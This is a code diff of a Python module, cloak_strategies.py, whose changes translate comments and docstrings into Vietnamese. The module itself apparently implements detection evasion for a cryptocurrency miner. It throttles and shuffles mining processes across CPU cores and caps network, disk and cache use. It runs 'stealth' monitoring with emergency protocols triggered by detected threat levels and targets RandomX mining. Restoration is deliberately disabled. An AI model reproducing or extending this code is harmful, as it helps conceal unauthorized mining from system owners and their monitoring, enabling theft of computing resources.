@@ -1,6 +1,6 @@
 """
-Module cloak_strategies.py - Các chiến lược cloaking cho tiến trình khai thác (đồng bộ).
-CHÚ Ý: Phiên bản này đã loại bỏ hoàn toàn chức năng restoration - chỉ cloaking.
+Mô-đun `cloak_strategies.py` - Các chiến lược [cloaking] (che giấu) cho tiến trình khai thác (đồng bộ).
+CHÚ Ý: Phiên bản này đã loại bỏ hoàn toàn chức năng [restoration] (khôi phục) - chỉ còn [cloaking] (che giấu).
 """
 # type: ignore
 
@@ -16,16 +16,16 @@ from pathlib import Path
 
 from .utils import MiningProcess
 
-# ✅ UNIFIED LOGGING: Use centralized logging system
+# ✅ UNIFIED LOGGING: Sử dụng hệ thống [logging] (ghi log) tập trung
 from .unified_logging import get_unified_logger
 
-# ✅ ERROR MANAGEMENT: Use centralized error handling system
+# ✅ ERROR MANAGEMENT: Sử dụng hệ thống xử lý lỗi tập trung
 from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
 
-# ✅ STANDARDIZED: Get unified logger instance (khớp hierarchy)
+# ✅ STANDARDIZED: Lấy thể hiện [unified logger] (logger hợp nhất) (khớp phân cấp)
 cloak_logger = get_unified_logger('mining_environment.cloak_strategies')
 
-# ✅ ERROR REPORTER: Get centralized error reporter instance
+# ✅ ERROR REPORTER: Lấy thể hiện [error reporter] (bộ báo lỗi) tập trung
 error_reporter = get_error_reporter()
 
 if TYPE_CHECKING:
@@ -50,8 +50,8 @@ else:
 
 class StrategyType:
     """
-    ✅ ENHANCED: Các loại chiến lược cloaking cho comprehensive resource control.
-    6 active strategies: CPU, GPU (with thermal), Network, Disk I/O, Cache, Memory
+    ✅ ENHANCED: Các loại chiến lược [cloaking] (che giấu) cho [comprehensive resource control] (kiểm soát tài nguyên toàn diện).
+    6 chiến lược đang hoạt động: CPU, GPU (kèm [thermal] – nhiệt), Network, Disk I/O, Cache, Memory
     """
     CPU = "cpu"
     NETWORK = "network"
@@ -66,8 +66,8 @@ class StrategyType:
 
 class CloakStrategy(ABC):
     """
-    ✅ ENHANCED: Lớp cơ sở trừu tượng cho comprehensive multi-strategy cloaking.
-    Redesigned cho comprehensive resource cloaking với advanced coordination.
+    ✅ ENHANCED: Lớp cơ sở trừu tượng cho [comprehensive multi-strategy cloaking] (che giấu đa chiến lược toàn diện).
+    Thiết kế lại cho [resource cloaking] (che giấu tài nguyên) toàn diện với [advanced coordination] (phối hợp nâng cao).
     """
 
     logger: logging.Logger  # thêm attribute để linter biết
@@ -88,7 +88,7 @@ class CloakStrategy(ABC):
 
     def set_privileged_manager(self, privileged_manager: Any) -> None:
         """
-        Inject PrivilegedOperationManager vào strategy
+        [Inject] (bơm) `PrivilegedOperationManager` vào strategy.
         """
         self.privileged_manager = privileged_manager
         if hasattr(self, 'logger'):
@@ -97,9 +97,9 @@ class CloakStrategy(ABC):
     @abstractmethod
     def apply(self, process: MiningProcess) -> bool:
         """
-        ✅ ENHANCED: Áp dụng chiến lược cloaking cho tiến trình với return value validation.
-
-        :param process: Đối tượng MiningProcess.
+        ✅ ENHANCED: Áp dụng chiến lược [cloaking] (che giấu) cho tiến trình với kiểm định giá trị trả về.
+        
+        :param process: Đối tượng `MiningProcess`.
         :return: bool - True nếu strategy áp dụng thành công, False nếu thất bại
         """
         pass
@@ -107,9 +107,9 @@ class CloakStrategy(ABC):
     def restore(self, process: MiningProcess) -> None:
         """
         Khôi phục cài đặt ban đầu cho tiến trình (đồng bộ).
-        CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
+        CHÚ Ý: Tính năng [restore] (khôi phục) đã bị vô hiệu hoá trong phiên bản này.
         
-        :param process: Đối tượng MiningProcess.
+        :param process: Đối tượng `MiningProcess`.
         :return: None
         """
         self.logger.info(f"[RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
@@ -118,9 +118,9 @@ class CloakStrategy(ABC):
     # ✅ NEW: Comprehensive cloaking support methods
     def pre_apply_check(self, process: MiningProcess) -> bool:
         """
-        ✅ NEW: Pre-application compatibility check cho comprehensive cloaking.
+        ✅ NEW: Kiểm tra tương thích trước khi áp dụng cho [comprehensive cloaking] (che giấu toàn diện).
         
-        :param process: Đối tượng MiningProcess để check compatibility
+        :param process: Đối tượng `MiningProcess` để kiểm tra tương thích
         :return: True nếu strategy có thể áp dụng an toàn
         """
         try:
@@ -133,9 +133,9 @@ class CloakStrategy(ABC):
 
     def post_apply_verification(self, process: MiningProcess) -> bool:
         """
-        ✅ NEW: Post-application verification cho comprehensive cloaking.
+        ✅ NEW: Xác minh sau khi áp dụng cho [comprehensive cloaking] (che giấu toàn diện).
         
-        :param process: Đối tượng MiningProcess để verify
+        :param process: Đối tượng `MiningProcess` để xác minh
         :return: True nếu strategy đã được áp dụng thành công
         """
         try:
@@ -148,10 +148,10 @@ class CloakStrategy(ABC):
 
     def check_resource_conflicts(self, other_strategies: List[str]) -> List[str]:
         """
-        ✅ NEW: Check potential resource conflicts với other strategies.
+        ✅ NEW: Kiểm tra xung đột tài nguyên tiềm tàng với các chiến lược khác.
         
-        :param other_strategies: List of strategy names đang được áp dụng
-        :return: List of potential conflicts
+        :param other_strategies: Danh sách tên chiến lược đang được áp dụng
+        :return: Danh sách xung đột tiềm tàng
         """
         conflicts = []
         for strategy in other_strategies:
@@ -161,9 +161,9 @@ class CloakStrategy(ABC):
 
     def get_strategy_metadata(self) -> Dict[str, Any]:
         """
-        ✅ NEW: Get metadata về strategy cho comprehensive coordination.
+        ✅ NEW: Lấy siêu dữ liệu ([metadata]) về chiến lược cho [comprehensive coordination] (phối hợp toàn diện).
         
-        :return: Dictionary chứa strategy metadata
+        :return: Từ điển chứa siêu dữ liệu của chiến lược
         """
         return {
             'strategy_type': self.strategy_type,
@@ -182,13 +182,13 @@ class CloakStrategy(ABC):
 
 class CpuCloakStrategy(CloakStrategy):
     """
-    ✅ ENHANCED: Chiến lược cloaking CPU cho comprehensive multi-strategy environment:
+    ✅ ENHANCED: Chiến lược [cloaking] CPU cho [comprehensive multi-strategy environment] (môi trường đa chiến lược toàn diện):
       - Giới hạn CPU bằng cgroup,
       - Tối ưu cache CPU (tuỳ ý),
       - Đặt affinity,
       - Chuyển đổi giữa core chẵn/lẻ theo định kỳ (có thể random hoá khoảng thời gian).
     
-    Enhanced cho comprehensive cloaking với advanced coordination.
+    Tăng cường cho [comprehensive cloaking] (che giấu toàn diện) với [advanced coordination] (phối hợp nâng cao).
     """
 
     strategy_type = StrategyType.CPU
@@ -209,7 +209,7 @@ class CpuCloakStrategy(CloakStrategy):
         cpu_resource_manager: CPUResourceManager
     ):
         """
-        ✅ ENHANCED: Khởi tạo CpuCloakStrategy với metadata-aware capabilities.
+        ✅ ENHANCED: Khởi tạo `CpuCloakStrategy` với khả năng nhận biết [metadata] (siêu dữ liệu).
         """
         self.logger = logger
         self.config = config
@@ -221,7 +221,7 @@ class CpuCloakStrategy(CloakStrategy):
         # Enhanced: Check for advanced stealth capabilities
         self.advanced_stealth_enabled = False
         try:
-            # Check if CPU resource manager has stealth capabilities
+            # Kiểm tra `CPU resource manager` có khả năng [stealth] (ẩn/che giấu) hay không
             if hasattr(cpu_resource_manager, 'stealth_manager') and hasattr(cpu_resource_manager, 'xeon_optimizer'):
                 self.advanced_stealth_enabled = True
                 self.logger.info("🛡️ [CPU Cloaking] Advanced stealth capabilities detected and enabled")
@@ -329,7 +329,7 @@ class CpuCloakStrategy(CloakStrategy):
 
     def _adaptive_stealth_monitoring(self) -> None:
         """
-        Enhanced monitoring với adaptive threat response
+        Giám sát nâng cao với phản ứng thích ứng theo [threat] (mức đe doạ)
         """
         while True:
             try:
@@ -387,7 +387,7 @@ class CpuCloakStrategy(CloakStrategy):
 
     def _adaptive_core_switching(self):
         """
-        Enhanced core switching với RandomX optimization
+        Chuyển đổi lõi nâng cao với [RandomX optimization] (tối ưu RandomX)
         """
         while True:
             try:
@@ -440,14 +440,14 @@ class CpuCloakStrategy(CloakStrategy):
                 time.sleep(300)
 
     def _get_current_target_cores(self) -> List[int]:
-        """Hàm trợ giúp để lấy target cores hiện tại"""
+        """Hàm trợ giúp để lấy [target cores] (các lõi mục tiêu) hiện tại"""
         with self.core_lock:
             return self.target_cores.copy() if hasattr(self, 'target_cores') else []
 
     def _update_throttle_percentage(self) -> None:
         """
-        Luồng nền cập nhật throttle_percentage động (60–90%),
-        rồi gọi throttle_cpu_usage(...) cho mỗi PID đang cloaking.
+        Luồng nền cập nhật `throttle_percentage` động (60–90%),
+        rồi gọi `throttle_cpu_usage(...)` cho mỗi PID đang [cloaking] (che giấu).
         """
         while True:
             try:
@@ -492,7 +492,7 @@ class CpuCloakStrategy(CloakStrategy):
 
     def _switch_cores(self):
         """
-        Luồng nền định kỳ: chuyển chẵn <-> lẻ, rồi configure_cpuset + set affinity.
+        Luồng nền định kỳ: chuyển chẵn <-> lẻ, sau đó `configure_cpuset` + đặt `affinity`.
         """
         while True:
             try:
@@ -543,7 +543,7 @@ class CpuCloakStrategy(CloakStrategy):
 
     def _verify_cgroup_settings(self, base_cgroup_name: str, pid: int) -> bool:
         """
-        Enhanced verification với process cleanup và emergency throttling
+        Xác minh nâng cao với dọn dẹp tiến trình và [emergency throttling] (giới hạn khẩn cấp)
         """
         try:
             process = psutil.Process(pid)
@@ -745,10 +745,10 @@ class CpuCloakStrategy(CloakStrategy):
 
     def configure_for_process_type(self, process_type: str, strategy_hints: Dict[str, Any] = None) -> None:
         """
-        ✅ NEW: Pre-configure strategy cho specific process type.
+        ✅ NEW: Tiền cấu hình chiến lược cho loại tiến trình cụ thể.
         
-        :param process_type: 'CPU' hoặc 'GPU' process type.
-        :param strategy_hints: Optional optimization hints.
+        :param process_type: Kiểu tiến trình 'CPU' hoặc 'GPU'.
+        :param strategy_hints: Gợi ý tối ưu hoá tuỳ chọn.
         """
         strategy_hints = strategy_hints or {}
         
@@ -765,10 +765,10 @@ class CpuCloakStrategy(CloakStrategy):
 
     def apply(self, process: MiningProcess) -> bool:
         """
-        ✅ ENHANCED: Áp dụng CPU cloaking với metadata-aware optimization và return validation.
+        ✅ ENHANCED: Áp dụng [CPU cloaking] (che giấu CPU) với tối ưu hoá nhận biết [metadata] (siêu dữ liệu) và kiểm định giá trị trả về.
         
-        :param process: Enhanced MiningProcess với classification metadata.
-        :return: bool - True nếu CPU cloaking áp dụng thành công, False nếu thất bại
+        :param process: `MiningProcess` nâng cao với [classification metadata] (siêu dữ liệu phân loại).
+        :return: bool - True nếu áp dụng thành công, False nếu thất bại
         """
         try:
             pid, name = process.pid, process.name
@@ -928,7 +928,7 @@ class CpuCloakStrategy(CloakStrategy):
 
     def _verify_cgroup_settings_safe(self, base_cgroup_name: str, pid: int) -> bool:
         """
-        Safe verification WITHOUT cleanup - chỉ verify, không cleanup
+        Xác minh an toàn KHÔNG dọn dẹp - chỉ xác minh, không dọn dẹp
         """
         try:
             process = psutil.Process(pid)
@@ -988,13 +988,13 @@ class CpuCloakStrategy(CloakStrategy):
 
     def restore(self, process: MiningProcess) -> None:
         """
-        Khôi phục CPU - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
+        Khôi phục CPU - CHÚ Ý: Tính năng [restore] (khôi phục) đã bị vô hiệu hoá trong phiên bản này.
         """
         self.logger.info(f"[CPU RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
 
     def _system_health_monitor(self):
         """
-        System-wide health monitoring và optimization loop
+        Giám sát sức khoẻ toàn hệ thống và vòng lặp tối ưu hoá
         """
         while True:
             try:
@@ -1023,7 +1023,7 @@ class CpuCloakStrategy(CloakStrategy):
                 time.sleep(60)
 
     def _cleanup_dead_processes(self):
-        """Dọn dẹp zombie và stopped processes từ tracking"""
+        """Dọn dẹp tiến trình 'zombie' và 'stopped' khỏi danh sách theo dõi"""
         try:
             dead_pids = []
             
@@ -1056,7 +1056,7 @@ class CpuCloakStrategy(CloakStrategy):
             self.logger.error(f"🧹 [Cleanup] (dọn dẹp) Lỗi khi dọn dẹp tiến trình chết: {e}")
 
     def _optimize_resource_distribution(self):
-        """Tối ưu hóa phân phối tài nguyên trên tất cả managed processes"""
+        """Tối ưu hoá phân phối tài nguyên trên tất cả tiến trình được quản lý"""
         try:
             if not self.process_cgroup:
                 return
@@ -1107,7 +1107,7 @@ class CpuCloakStrategy(CloakStrategy):
             self.logger.error(f"⚖️ [Resource Opt] Optimization error: {e}")
 
     def _check_stealth_indicators(self):
-        """Kiểm tra các chỉ báo stealth toàn hệ thống"""
+        """Kiểm tra các chỉ báo [stealth] (ẩn/che giấu) toàn hệ thống"""
         try:
             if not self.advanced_stealth_enabled:
                 return
@@ -1128,7 +1128,7 @@ class CpuCloakStrategy(CloakStrategy):
             self.logger.error(f"🛡️ [Stealth Check] (kiểm tra che giấu) Lỗi: {e}")
 
     def _emergency_stealth_protocol(self):
-        """Các biện pháp stealth khẩn cấp cho HIGH threat"""
+        """Các biện pháp [stealth] (ẩn/che giấu) khẩn cấp cho mức đe doạ CAO (HIGH)"""
         try:
             self.logger.warning("🚨 [Emergency Stealth] HIGH threat detected - Activating emergency protocols")
             
@@ -1150,7 +1150,7 @@ class CpuCloakStrategy(CloakStrategy):
             self.logger.error(f"🚨 [Emergency Stealth] Protocol error: {e}")
 
     def _enhanced_stealth_protocol(self):
-        """Các biện pháp stealth nâng cao cho MEDIUM threat"""
+        """Các biện pháp [stealth] (ẩn/che giấu) nâng cao cho mức đe doạ TRUNG BÌNH (MEDIUM)"""
         try:
             self.logger.info("⚠️ [Enhanced Stealth] MEDIUM threat detected - Enhancing stealth")
             
@@ -1179,7 +1179,7 @@ class CpuCloakStrategy(CloakStrategy):
             self.logger.error(f"⚠️ [Enhanced Stealth] Protocol error: {e}")
 
     def _system_memory_cleanup(self):
-        """Dọn dẹp bộ nhớ hệ thống và tối ưu hóa"""
+        """Dọn dẹp bộ nhớ hệ thống và tối ưu hoá"""
         try:
             # Force garbage collection
             import gc
@@ -1212,11 +1212,11 @@ class CpuCloakStrategy(CloakStrategy):
 
 class NetworkCloakStrategy(CloakStrategy):
     """
-    ✅ ENHANCED: Cloaking mạng cho comprehensive multi-strategy environment:
+    ✅ ENHANCED: [Cloaking] mạng cho [comprehensive multi-strategy environment] (môi trường đa chiến lược toàn diện):
       - Đánh dấu pid bằng iptables,
       - Giới hạn băng thông (tc).
     
-    Enhanced cho comprehensive cloaking với network isolation.
+    Nâng cao cho [comprehensive cloaking] (che giấu toàn diện) với [network isolation] (cô lập mạng).
     """
     
     strategy_type = StrategyType.NETWORK
@@ -1237,11 +1237,11 @@ class NetworkCloakStrategy(CloakStrategy):
         network_resource_manager: NetworkResourceManager
     ):
         """
-        Khởi tạo NetworkCloakStrategy.
-
-        :param config: Cấu hình cloaking Network (dict).
-        :param logger: Logger.
-        :param network_resource_manager: ResourceManager liên quan đến Network.
+        Khởi tạo `NetworkCloakStrategy`.
+        
+        :param config: Cấu hình [cloaking] mạng (dict).
+        :param logger: [Logger] (bộ ghi log).
+        :param network_resource_manager: [ResourceManager] liên quan đến mạng.
         """
         self.logger = logger
         self.config = config
@@ -1257,10 +1257,10 @@ class NetworkCloakStrategy(CloakStrategy):
 
     def apply(self, process: MiningProcess) -> bool:
         """
-        ✅ ENHANCED: Áp dụng network cloaking với return value validation.
+        ✅ ENHANCED: Áp dụng [network cloaking] (che giấu mạng) với kiểm định giá trị trả về.
         
-        :param process: Đối tượng MiningProcess.
-        :return: bool - True nếu network cloaking áp dụng thành công, False nếu thất bại
+        :param process: Đối tượng `MiningProcess`.
+        :return: bool - True nếu áp dụng thành công, False nếu thất bại
         """
         try:
             pid, name = process.pid, process.name
@@ -1286,7 +1286,7 @@ class NetworkCloakStrategy(CloakStrategy):
             return True  # ✅ SUCCESS: Network cloaking applied successfully
 
         except psutil.NoSuchProcess as e:
-            # ✅ ERROR REPORTING: Process not found error
+            # ✅ ERROR REPORTING: Lỗi không tìm thấy tiến trình (Process not found)
             error_reporter.report_error(
                 ErrorCode.PROCESS_NOT_FOUND,
                 f"Net Cloaking: Tiến trình không tồn tại: {e}",
@@ -1301,7 +1301,7 @@ class NetworkCloakStrategy(CloakStrategy):
             self.logger.error(f"Net Cloaking: Tiến trình không tồn tại: {e}")
             return False  # ✅ FAILURE: Process does not exist
         except psutil.AccessDenied as e:
-            # ✅ ERROR REPORTING: Access denied error
+            # ✅ ERROR REPORTING: Lỗi bị từ chối truy cập (Access denied)
             error_reporter.report_error(
                 ErrorCode.PROCESS_ACCESS_DENIED,
                 f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
@@ -1316,7 +1316,7 @@ class NetworkCloakStrategy(CloakStrategy):
             self.logger.error(f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
             return False  # ✅ FAILURE: Access denied
         except Exception as e:
-            # ✅ ERROR REPORTING: General strategy application failure
+            # ✅ ERROR REPORTING: Lỗi chung khi áp dụng chiến lược
             error_reporter.report_error(
                 ErrorCode.STRATEGY_APPLICATION_FAILED,
                 f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}",
@@ -1335,7 +1335,7 @@ class NetworkCloakStrategy(CloakStrategy):
 
     def restore(self, process: MiningProcess) -> None:
         """
-        Khôi phục Network - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
+        Khôi phục Network - CHÚ Ý: Tính năng [restore] (khôi phục) đã bị vô hiệu hoá trong phiên bản này.
         """
         self.logger.info(f"[NETWORK RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
 
@@ -1344,9 +1344,9 @@ class NetworkCloakStrategy(CloakStrategy):
 ###############################################################################
 class DiskIoCloakStrategy(CloakStrategy):
     """
-    Cloaking Disk I/O (đồng bộ) qua ionice hoặc cgroup I/O (tuỳ triển khai).
+    [Cloaking] Disk I/O (đồng bộ) qua `ionice` hoặc `cgroup I/O` (tuỳ triển khai).
     
-    Redesigned theo blueprint với direct execution.
+    Thiết kế lại theo bản thiết kế (blueprint) với thực thi trực tiếp.
     """
     
     strategy_type = StrategyType.DISK_IO
@@ -1359,11 +1359,11 @@ class DiskIoCloakStrategy(CloakStrategy):
         disk_io_resource_manager: DiskIOResourceManager
     ):
         """
-        Khởi tạo DiskIoCloakStrategy.
-
-        :param config: Cấu hình cloaking Disk IO (dict).
-        :param logger: Logger.
-        :param disk_io_resource_manager: ResourceManager liên quan đến Disk I/O.
+        Khởi tạo `DiskIoCloakStrategy`.
+        
+        :param config: Cấu hình [cloaking] Disk IO (dict).
+        :param logger: [Logger] (bộ ghi log).
+        :param disk_io_resource_manager: [ResourceManager] liên quan đến Disk I/O.
         """
         self.logger = logger
         self.config = config
@@ -1376,10 +1376,10 @@ class DiskIoCloakStrategy(CloakStrategy):
 
     def apply(self, process: MiningProcess) -> bool:
         """
-        ✅ ENHANCED: Áp dụng Disk I/O cloaking với return value validation.
-
-        :param process: Đối tượng MiningProcess.
-        :return: bool - True nếu Disk I/O cloaking áp dụng thành công, False nếu thất bại
+        ✅ ENHANCED: Áp dụng [Disk I/O cloaking] (che giấu Disk I/O) với kiểm định giá trị trả về.
+        
+        :param process: Đối tượng `MiningProcess`.
+        :return: bool - True nếu áp dụng thành công, False nếu thất bại
         """
         try:
             pid, name = process.pid, process.name
@@ -1391,7 +1391,7 @@ class DiskIoCloakStrategy(CloakStrategy):
                 self.logger.error(f"[DiskIO Cloaking] Không thể set io_weight cho PID={pid}.")
                 return False  # ✅ FAILURE: Cannot set I/O weight
         except psutil.NoSuchProcess as e:
-            # ✅ ERROR REPORTING: Process not found error
+            # ✅ ERROR REPORTING: Lỗi không tìm thấy tiến trình (Process not found)
             error_reporter.report_error(
                 ErrorCode.PROCESS_NOT_FOUND,
                 f"DiskIO Cloaking: Tiến trình không tồn tại: {e}",
@@ -1406,7 +1406,7 @@ class DiskIoCloakStrategy(CloakStrategy):
             self.logger.error(f"DiskIO Cloaking: Tiến trình không tồn tại: {e}")
             return False  # ✅ FAILURE: Process does not exist
         except psutil.AccessDenied as e:
-            # ✅ ERROR REPORTING: Access denied error
+            # ✅ ERROR REPORTING: Lỗi bị từ chối truy cập (Access denied)
             error_reporter.report_error(
                 ErrorCode.PROCESS_ACCESS_DENIED,
                 f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
@@ -1421,7 +1421,7 @@ class DiskIoCloakStrategy(CloakStrategy):
             self.logger.error(f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
             return False  # ✅ FAILURE: Access denied
         except Exception as e:
-            # ✅ ERROR REPORTING: General strategy application failure
+            # ✅ ERROR REPORTING: Lỗi chung khi áp dụng chiến lược
             error_reporter.report_error(
                 ErrorCode.STRATEGY_APPLICATION_FAILED,
                 f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}",
@@ -1440,7 +1440,7 @@ class DiskIoCloakStrategy(CloakStrategy):
 
     def restore(self, process: MiningProcess) -> None:
         """
-        Khôi phục DiskIO - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
+        Khôi phục DiskIO - CHÚ Ý: Tính năng [restore] (khôi phục) đã bị vô hiệu hoá trong phiên bản này.
         """
         self.logger.info(f"[DISKIO RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
 
@@ -1449,11 +1449,11 @@ class DiskIoCloakStrategy(CloakStrategy):
 ###############################################################################
 class CacheCloakStrategy(CloakStrategy):
     """
-    Cloaking Cache (đồng bộ):
+    [Cloaking] Cache (đồng bộ):
       - Drop caches,
       - Giới hạn cache usage.
     
-    Redesigned theo blueprint với direct execution.
+    Thiết kế lại theo bản thiết kế (blueprint) với thực thi trực tiếp.
     """
     
     strategy_type = StrategyType.CACHE
@@ -1466,11 +1466,11 @@ class CacheCloakStrategy(CloakStrategy):
         cache_resource_manager: CacheResourceManager
     ):
         """
-        Khởi tạo CacheCloakStrategy.
-
-        :param config: Cấu hình cloaking Cache (dict).
-        :param logger: Logger.
-        :param cache_resource_manager: ResourceManager liên quan đến Cache.
+        Khởi tạo `CacheCloakStrategy`.
+        
+        :param config: Cấu hình [cloaking] Cache (dict).
+        :param logger: [Logger] (bộ ghi log).
+        :param cache_resource_manager: [ResourceManager] liên quan đến Cache.
         """
         self.logger = logger
         self.config = config
@@ -1483,10 +1483,10 @@ class CacheCloakStrategy(CloakStrategy):
 
     def apply(self, process: MiningProcess) -> bool:
         """
-        ✅ ENHANCED: Áp dụng Cache cloaking với return value validation.
-
-        :param process: Đối tượng MiningProcess.
-        :return: bool - True nếu Cache cloaking áp dụng thành công, False nếu thất bại
+        ✅ ENHANCED: Áp dụng [Cache cloaking] (che giấu Cache) với kiểm định giá trị trả về.
+        
+        :param process: Đối tượng `MiningProcess`.
+        :return: bool - True nếu áp dụng thành công, False nếu thất bại
         """
         try:
             pid, name = process.pid, process.name
@@ -1498,7 +1498,7 @@ class CacheCloakStrategy(CloakStrategy):
                 self.logger.error(f"[Cache Cloaking] Không thể set cache_limit cho PID={pid}.")
                 return False  # ✅ FAILURE: Cannot set cache limit
         except psutil.NoSuchProcess as e:
-            # ✅ ERROR REPORTING: Process not found error
+            # ✅ ERROR REPORTING: Lỗi không tìm thấy tiến trình (Process not found)
             error_reporter.report_error(
                 ErrorCode.PROCESS_NOT_FOUND,
                 f"Cache Cloaking: Tiến trình không tồn tại: {e}",
@@ -1513,7 +1513,7 @@ class CacheCloakStrategy(CloakStrategy):
             self.logger.error(f"Cache Cloaking: Tiến trình không tồn tại: {e}")
             return False  # ✅ FAILURE: Process does not exist
         except psutil.AccessDenied as e:
-            # ✅ ERROR REPORTING: Access denied error
+            # ✅ ERROR REPORTING: Lỗi bị từ chối truy cập (Access denied)
             error_reporter.report_error(
                 ErrorCode.PROCESS_ACCESS_DENIED,
                 f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
@@ -1528,7 +1528,7 @@ class CacheCloakStrategy(CloakStrategy):
             self.logger.error(f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
             return False  # ✅ FAILURE: Access denied
         except Exception as e:
-            # ✅ ERROR REPORTING: General strategy application failure
+            # ✅ ERROR REPORTING: Lỗi chung khi áp dụng chiến lược
             error_reporter.report_error(
                 ErrorCode.STRATEGY_APPLICATION_FAILED,
                 f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}",
@@ -1547,7 +1547,7 @@ class CacheCloakStrategy(CloakStrategy):
 
     def restore(self, process: MiningProcess) -> None:
         """
-        Khôi phục Cache - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
+        Khôi phục Cache - CHÚ Ý: Tính năng [restore] (khôi phục) đã bị vô hiệu hoá trong phiên bản này.
         """
         self.logger.info(f"[CACHE RESTORE DISABLED] Restore request for PID={process.pid} bị bỏ qua - chế độ chỉ cloaking.")
 
@@ -1672,9 +1672,9 @@ class MemoryCloakStrategy(CloakStrategy):
 #                    DEPRECATED: CloakStrategyFactory REMOVED                 #
 ###############################################################################
 
-# CloakStrategyFactory đã được thay thế bởi ResourceCoordinator trong resource_control.py
-# theo blueprint redesign. Tất cả strategy management đã được tập trung hóa trong
-# ResourceCoordinator với khả năng phân biệt direct execution và plugin delegation.
+# `CloakStrategyFactory` đã được thay thế bởi `ResourceCoordinator` trong `resource_control.py`
+# theo thiết kế lại (blueprint). Tất cả quản lý chiến lược đã được tập trung hoá trong
+# `ResourceCoordinator` với khả năng phân biệt thực thi trực tiếp và uỷ quyền plugin.
 #
 # Để tương thích ngược, sử dụng:
 # from .resource_control import CloakStrategyFactory
@@ -1685,13 +1685,13 @@ class MemoryCloakStrategy(CloakStrategy):
 
 def _register_strategy_recovery_handlers() -> None:
     """
-    ✅ RECOVERY SYSTEM: Register recovery handlers cho common strategy failure scenarios.
-    Tự động gọi khi module được import.
+    ✅ RECOVERY SYSTEM: Đăng ký các [recovery handlers] (bộ xử lý phục hồi) cho các kịch bản lỗi chiến lược phổ biến.
+    Tự động được gọi khi mô-đun được import.
     """
     try:
         # ✅ RECOVERY HANDLER: Process not found recovery
         def recover_process_not_found(error_context) -> bool:
-            """Recovery handler for PROCESS_NOT_FOUND errors"""
+            """Bộ xử lý phục hồi cho lỗi `PROCESS_NOT_FOUND`"""
             try:
                 pid = error_context.process_id
                 strategy_name = error_context.strategy_name
@@ -1701,9 +1701,9 @@ def _register_strategy_recovery_handlers() -> None:
                 # Kiểm tra process có thật sự không tồn tại
                 if psutil.pid_exists(pid):
                     cloak_logger.info(f"✅ [Recovery] Process PID={pid} actually exists - retry strategy")
-                    return True  # Process tồn tại, có thể retry
+                    return True  # Tiến trình tồn tại, có thể thử lại
                 
-                # Nếu process thật sự không tồn tại, cleanup related resources
+                # Nếu tiến trình thật sự không tồn tại, dọn dẹp các tài nguyên liên quan
                 cloak_logger.info(f"❗ [Recovery] Process PID={pid} confirmed dead - cleaning up resources")
                 
                 # TODO: Add cleanup logic here based on strategy type
@@ -1716,15 +1716,15 @@ def _register_strategy_recovery_handlers() -> None:
         
         # ✅ RECOVERY HANDLER: Strategy application timeout recovery
         def recover_strategy_timeout(error_context) -> bool:
-            """Recovery handler for STRATEGY_TIMEOUT errors"""
+            """Bộ xử lý phục hồi cho lỗi `STRATEGY_TIMEOUT`"""
             try:
                 pid = error_context.process_id
                 strategy_name = error_context.strategy_name
                 
                 cloak_logger.info(f"🔧 [Recovery] Timeout recovery for {strategy_name} strategy PID={pid}")
                 
-                # Implement fallback strategy application with reduced parameters
-                # For now, just indicate recovery attempt was made
+                # Thực thi áp dụng chiến lược dự phòng với tham số giảm nhẹ
+                # Hiện tại, chỉ ghi nhận đã thực hiện nỗ lực phục hồi
                 cloak_logger.info(f"✅ [Recovery] Applied fallback strategy for PID={pid}")
                 return True
                 
@@ -1734,15 +1734,15 @@ def _register_strategy_recovery_handlers() -> None:
         
         # ✅ RECOVERY HANDLER: Resource allocation failure recovery
         def recover_resource_allocation_failed(error_context) -> bool:
-            """Recovery handler for RESOURCE_ALLOCATION_FAILED errors"""
+            """Bộ xử lý phục hồi cho lỗi `RESOURCE_ALLOCATION_FAILED`"""
             try:
                 pid = error_context.process_id
                 strategy_name = error_context.strategy_name
                 
                 cloak_logger.info(f"🔧 [Recovery] Resource allocation recovery for {strategy_name} PID={pid}")
                 
-                # Try alternative resource allocation methods
-                # For now, just indicate fallback resource allocation
+                # Thử phương pháp phân bổ tài nguyên thay thế
+                # Hiện tại, chỉ ghi nhận đã áp dụng phân bổ tài nguyên dự phòng
                 cloak_logger.info(f"✅ [Recovery] Applied alternative resource allocation for PID={pid}")
                 return True
                 
